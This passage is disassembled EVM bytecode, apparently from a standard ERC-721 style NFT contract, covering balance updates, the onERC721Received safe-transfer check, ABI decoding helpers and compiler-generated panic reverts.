SWAP5 POP PUSH1 0x0 DUP6 EQ ISZERO PUSH2 0x113D JUMPI PUSH2 0x1142 JUMP JUMPDEST PUSH2 0x10E3 JUMP JUMPDEST DUP2 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x116F DUP4 PUSH2 0xE58 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 DUP2 GT ISZERO PUSH2 0x12AE JUMPI PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1222 JUMPI DUP1 PUSH1 0x3 PUSH1 0x0 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x121A SWAP2 SWAP1 PUSH2 0x1DE7 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x12AD JUMPI DUP1 PUSH1 0x3 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x12A5 SWAP2 SWAP1 PUSH2 0x1D91 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST JUMPDEST POP POP POP POP JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x12DB DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x15A4 JUMP JUMPDEST ISZERO PUSH2 0x1444 JUMPI DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x150B7A02 PUSH2 0x1304 PUSH2 0xA08 JUMP JUMPDEST DUP8 DUP7 DUP7 PUSH1 0x40 MLOAD DUP6 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1326 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x1B34 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1340 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH2 0x1371 JUMPI POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x136E SWAP2 SWAP1 PUSH2 0x1890 JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH2 0x13F4 JUMPI RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x13A1 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x13A6 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD EQ ISZERO PUSH2 0x13EC JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x13E3 SWAP1 PUSH2 0x1BDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 MLOAD DUP2 PUSH1 0x20 ADD REVERT JUMPDEST PUSH4 0x150B7A02 PUSH1 0xE0 SHL PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ SWAP2 POP POP PUSH2 0x1449 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 POP PUSH27 0x184F03E93FF9F4DAA797ED6E38ED64BF6A1F010000000000000000 DUP4 LT PUSH2 0x14AF JUMPI PUSH27 0x184F03E93FF9F4DAA797ED6E38ED64BF6A1F010000000000000000 DUP4 DUP2 PUSH2 0x14A5 JUMPI PUSH2 0x14A4 PUSH2 0x1F63 JUMP JUMPDEST JUMPDEST DIV SWAP3 POP PUSH1 0x40 DUP2 ADD SWAP1 POP JUMPDEST PUSH14 0x4EE2D6D415B85ACEF8100000000 DUP4 LT PUSH2 0x14EC JUMPI PUSH14 0x4EE2D6D415B85ACEF8100000000 DUP4 DUP2 PUSH2 0x14E2 JUMPI PUSH2 0x14E1 PUSH2 0x1F63 JUMP JUMPDEST JUMPDEST DIV SWAP3 POP PUSH1 0x20 DUP2 ADD SWAP1 POP JUMPDEST PUSH7 0x2386F26FC10000 DUP4 LT PUSH2 0x151B JUMPI PUSH7 0x2386F26FC10000 DUP4 DUP2 PUSH2 0x1511 JUMPI PUSH2 0x1510 PUSH2 0x1F63 JUMP JUMPDEST JUMPDEST DIV SWAP3 POP PUSH1 0x10 DUP2 ADD SWAP1 POP JUMPDEST PUSH4 0x5F5E100 DUP4 LT PUSH2 0x1544 JUMPI PUSH4 0x5F5E100 DUP4 DUP2 PUSH2 0x153A JUMPI PUSH2 0x1539 PUSH2 0x1F63 JUMP JUMPDEST JUMPDEST DIV SWAP3 POP PUSH1 0x8 DUP2 ADD SWAP1 POP JUMPDEST PUSH2 0x2710 DUP4 LT PUSH2 0x1569 JUMPI PUSH2 0x2710 DUP4 DUP2 PUSH2 0x155F JUMPI PUSH2 0x155E PUSH2 0x1F63 JUMP JUMPDEST JUMPDEST DIV SWAP3 POP PUSH1 0x4 DUP2 ADD SWAP1 POP JUMPDEST PUSH1 0x64 DUP4 LT PUSH2 0x158C JUMPI PUSH1 0x64 DUP4 DUP2 PUSH2 0x1582 JUMPI PUSH2 0x1581 PUSH2 0x1F63 JUMP JUMPDEST JUMPDEST DIV SWAP3 POP PUSH1 0x2 DUP2 ADD SWAP1 POP JUMPDEST PUSH1 0xA DUP4 LT PUSH2 0x159B JUMPI PUSH1 0x1 DUP2 ADD SWAP1 POP JUMPDEST DUP1 SWAP2 POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EXTCODESIZE GT SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x15DA PUSH2 0x15D5 DUP5 PUSH2 0x1D1D JUMP JUMPDEST PUSH2 0x1CF8 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x15F6 JUMPI PUSH2 0x15F5 PUSH2 0x1FF5 JUMP JUMPDEST JUMPDEST PUSH2 0x1601 DUP5 DUP3 DUP6 PUSH2 0x1E8F JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1618 DUP2 PUSH2 0x2290 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x162D DUP2 PUSH2 0x22A7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1642 DUP2 PUSH2 0x22BE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x1657 DUP2 PUSH2 0x22BE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x1672 JUMPI PUSH2 0x1671 PUSH2 0x1FF0 JUMP JUMPDEST JUMPDEST DUP2 CALLDATALOAD PUSH2 0x1682 DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x15C7 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x169A DUP2 PUSH2 0x22D5 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x16B6 JUMPI PUSH2 0x16B5 PUSH2 0x1FFF JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x16C4 DUP5 DUP3 DUP6 ADD PUSH2 0x1609 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x16E4 JUMPI PUSH2 0x16E3 PUSH2 0x1FFF JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x16F2 DUP6 DUP3 DUP7 ADD PUSH2 0x1609 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1703 DUP6 DUP3 DUP7 ADD PUSH2 0x1609 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x1726 JUMPI PUSH2 0x1725 PUSH2 0x1FFF JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1734 DUP7 DUP3 DUP8 ADD PUSH2 0x1609 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x20 PUSH2 0x1745 DUP7 DUP3 DUP8 ADD PUSH2 0x1609 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x40 PUSH2 0x1756 DUP7 DUP3 DUP8 ADD PUSH2 0x168B JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x80 DUP6 DUP8 SUB SLT ISZERO PUSH2 0x177A JUMPI PUSH2 0x1779 PUSH2 0x1FFF JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1788 DUP8 DUP3 DUP9 ADD PUSH2 0x1609 JUMP JUMPDEST SWAP5 POP POP PUSH1 0x20 PUSH2 0x1799 DUP8 DUP3 DUP9 ADD PUSH2 0x1609 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x40 PUSH2 0x17AA DUP8 DUP3 DUP9 ADD PUSH2 0x168B JUMP JUMPDEST SWAP3 POP POP PUSH1 0x60 DUP6 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x17CB JUMPI PUSH2 0x17CA PUSH2 0x1FFA JUMP JUMPDEST JUMPDEST PUSH2 0x17D7 DUP8 DUP3 DUP9 ADD PUSH2 0x165D JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP6 SWAP2 SWAP5 POP SWAP3 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x17FA JUMPI PUSH2 0x17F9 PUSH2 0x1FFF JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1808 DUP6 DUP3 DUP7 ADD PUSH2 0x1609 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1819 DUP6 DUP3 DUP7 ADD PUSH2 0x161E JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x183A JUMPI PUSH2 0x1839 PUSH2 0x1FFF JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1848 DUP6 DUP3 DUP7 ADD PUSH2 0x1609 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1859 DUP6 DUP3 DUP7 ADD PUSH2 0x168B JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1879 JUMPI PUSH2 0x1878 PUSH2 0x1FFF JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1887 DUP5 DUP3 DUP6 ADD PUSH2 0x1633 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x18A6 JUMPI PUSH2 0x18A5 PUSH2 0x1FFF JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x18B4 DUP5 DUP3 DUP6 ADD PUSH2 0x1648 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x18D3 JUMPI PUSH2 0x18D2 PUSH2 0x1FFF JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x18E1 DUP5 DUP3 DUP6 ADD PUSH2 0x168B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x18F3 DUP2 PUSH2 0x1E1B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1902 DUP2 PUSH2 0x1E2D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1913 DUP3 PUSH2 0x1D4E JUMP JUMPDEST PUSH2 0x191D DUP2 DUP6 PUSH2 0x1D64 JUMP JUMPDEST SWAP4 POP PUSH2 0x192D DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x1E9E JUMP JUMPDEST PUSH2 0x1936 DUP2 PUSH2 0x2004 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x194C DUP3 PUSH2 0x1D59 JUMP JUMPDEST PUSH2 0x1956 DUP2 DUP6 PUSH2 0x1D75 JUMP JUMPDEST SWAP4 POP PUSH2 0x1966 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x1E9E JUMP JUMPDEST PUSH2 0x196F DUP2 PUSH2 0x2004 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1985 DUP3 PUSH2 0x1D59 JUMP JUMPDEST PUSH2 0x198F DUP2 DUP6 PUSH2 0x1D86 JUMP JUMPDEST SWAP4 POP PUSH2 0x199F DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x1E9E JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x19B8 PUSH1 0x2D DUP4 PUSH2 0x1D75 JUMP JUMPDEST SWAP2 POP PUSH2 0x19C3 DUP3 PUSH2 0x2015 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x19DB PUSH1 0x32 DUP4 PUSH2 0x1D75 JUMP JUMPDEST SWAP2 POP PUSH2 0x19E6 DUP3 PUSH2 0x2064 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x19FE PUSH1 0x25 DUP4 PUSH2 0x1D75 JUMP JUMPDEST SWAP2 POP PUSH2 0x1A09 DUP3 PUSH2 0x20B3 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1A21 PUSH1 0x24 DUP4 PUSH2 0x1D75 JUMP JUMPDEST SWAP2 POP PUSH2 0x1A2C DUP3 PUSH2 0x2102 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1A44 PUSH1 0x19 DUP4 PUSH2 0x1D75 JUMP JUMPDEST SWAP2 POP PUSH2 0x1A4F DUP3 PUSH2 0x2151 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1A67 PUSH1 0x29 DUP4 PUSH2 0x1D75 JUMP JUMPDEST SWAP2 POP PUSH2 0x1A72 DUP3 PUSH2 0x217A JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1A8A PUSH1 0x18 DUP4 PUSH2 0x1D75 JUMP JUMPDEST SWAP2 POP PUSH2 0x1A95 DUP3 PUSH2 0x21C9 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1AAD PUSH1 0x21 DUP4 PUSH2 0x1D75 JUMP JUMPDEST SWAP2 POP PUSH2 0x1AB8 DUP3 PUSH2 0x21F2 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1AD0 PUSH1 0x3D DUP4 PUSH2 0x1D75 JUMP JUMPDEST SWAP2 POP PUSH2 0x1ADB DUP3 PUSH2 0x2241 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1AEF DUP2 PUSH2 0x1E85 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B01 DUP3 DUP6 PUSH2 0x197A JUMP JUMPDEST SWAP2 POP PUSH2 0x1B0D DUP3 DUP5 PUSH2 0x197A JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B2E PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x18EA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x80 DUP3 ADD SWAP1 POP PUSH2 0x1B49 PUSH1 0x0 DUP4 ADD DUP8 PUSH2 0x18EA JUMP JUMPDEST PUSH2 0x1B56 PUSH1 0x20 DUP4 ADD DUP7 PUSH2 0x18EA JUMP JUMPDEST PUSH2 0x1B63 PUSH1 0x40 DUP4 ADD DUP6 PUSH2 0x1AE6 JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x60 DUP4 ADD MSTORE PUSH2 0x1B75 DUP2 DUP5 PUSH2 0x1908 JUMP JUMPDEST SWAP1 POP SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B95 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x18F9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1BB5 DUP2 DUP5 PUSH2 0x1941 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1BD6 DUP2 PUSH2 0x19AB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1BF6 DUP2 PUSH2 0x19CE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1C16 DUP2 PUSH2 0x19F1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1C36 DUP2 PUSH2 0x1A14 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1C56 DUP2 PUSH2 0x1A37 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1C76 DUP2 PUSH2 0x1A5A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1C96 DUP2 PUSH2 0x1A7D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1CB6 DUP2 PUSH2 0x1AA0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1CD6 DUP2 PUSH2 0x1AC3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1CF2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1AE6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1D02 PUSH2 0x1D13 JUMP JUMPDEST SWAP1 POP PUSH2 0x1D0E DUP3 DUP3 PUSH2 0x1F03 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x1D38 JUMPI PUSH2 0x1D37 PUSH2 0x1FC1 JUMP JUMPDEST JUMPDEST PUSH2 0x1D41 DUP3 PUSH2 0x2004 JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1D9C DUP3 PUSH2 0x1E85 JUMP JUMPDEST SWAP2 POP PUSH2 0x1DA7 DUP4 PUSH2 0x1E85 JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x1DDC JUMPI PUSH2 0x1DDB PUSH2 0x1F34 JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1DF2 DUP3 PUSH2 0x1E85 JUMP JUMPDEST SWAP2 POP PUSH2 0x1DFD DUP4 PUSH2 0x1E85 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x1E10 JUMPI PUSH2 0x1E0F PUSH2 0x1F34 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1E26 DUP3 PUSH2 0x1E65 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH1 0x0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x1EBC JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x1EA1 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x1ECB JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x1EE9 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 EQ ISZERO PUSH2 0x1EFD JUMPI PUSH2 0x1EFC PUSH2 0x1F92 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1F0C DUP3 PUSH2 0x2004 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x1F2B JUMPI PUSH2 0x1F2A PUSH2 0x1FC1 JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST 